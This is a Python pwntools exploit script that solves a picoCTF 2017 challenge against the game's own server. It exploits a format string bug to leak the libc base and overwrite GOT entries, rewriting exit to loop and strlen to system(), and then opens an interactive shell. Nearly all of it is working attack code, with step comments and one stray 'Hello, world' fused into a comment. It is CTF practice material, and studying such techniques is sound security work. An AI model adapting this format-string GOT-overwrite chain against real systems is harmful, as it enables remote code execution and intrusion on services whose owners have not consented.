

'''
Greetz @_py on 0x00sec.org forum!

Without his awesome write-ups (link below), I won't be able to understand and finish this challenge. 

Link: https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920
'''


from pwn import *

#p = process(["./console", "log"])
p = remote('shell2017.picoctf.com', 26325)

FGETS_GOT   = 0x601230
EXIT_GOT    = 0x601258
STRLEN_GOT  = 0x601210
LOOP_FUNC   = 0x4009bd

SYSTEM_LIBC = 0x41490  # pico server: 0x41490, local: 0x45390
FGETS_LIBC  = 0x69df0  # pico server: 0x69df0, local: 0x6dad0
STRLEN_LIBC = 0x81c10  # pico server: 0x81c10, local: 0x8ab70

def write_word(addr, data):
    payload  = "e".ljust(8)
    payload += ("%{}x %17$hn".format(data-7)).ljust(16)
    payload += p64(addr)
    p.sendline(payload)
    p.recvline()

"""
1. First step is to patch exit@plt to LOOP_FUNC address, 
   this is to ensure we can enter input for many time later
"""

write_word(EXIT_GOT, LOOP_FUNC & 0xffff)

"""
2. Get libc base address through leak
"""

payload  = "e".ljust(8)
payload += "<%16$s>".ljust(8)
payload += p64(FGETS_GOT)
p.sendline(payload)

FGETS_ADDR = u64(p.recvuntil(">").split("<")[1][:-1].ljust(8, '\x00'))
LIBC = FGETS_ADDR - FGETS_LIBC # get libc base addressHello, world
SYSTEM_ADDR = LIBC+SYSTEM_LIBC

print("libc:    {}".format(hex(LIBC)))
print("system:  {}".format(hex(SYSTEM_ADDR)))
print("fgets: {}".format(hex(FGETS_ADDR)))

"""
3. Run `prompt <>` once to resolve real strlen() address in GOT table
   More info here: https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488/
"""

p.sendline("p <>")

"""
4. Over-write strlen() address with system() address
   This is possible because last 0xffffff between these two addresses is same, even ASLR is ON
   So we can solve this problem even with ASLR enabled
"""

first_chunk  =  SYSTEM_ADDR & 0x0000ffff
second_chunk = (SYSTEM_ADDR & 0xffff0000) >> 16
write_word(STRLEN_GOT, first_chunk) # first write
write_word(STRLEN_GOT+2, second_chunk) # second write

"""
5. shell time bij!
"""

# p <code execution>
p.sendline("p sh")
p.interactive()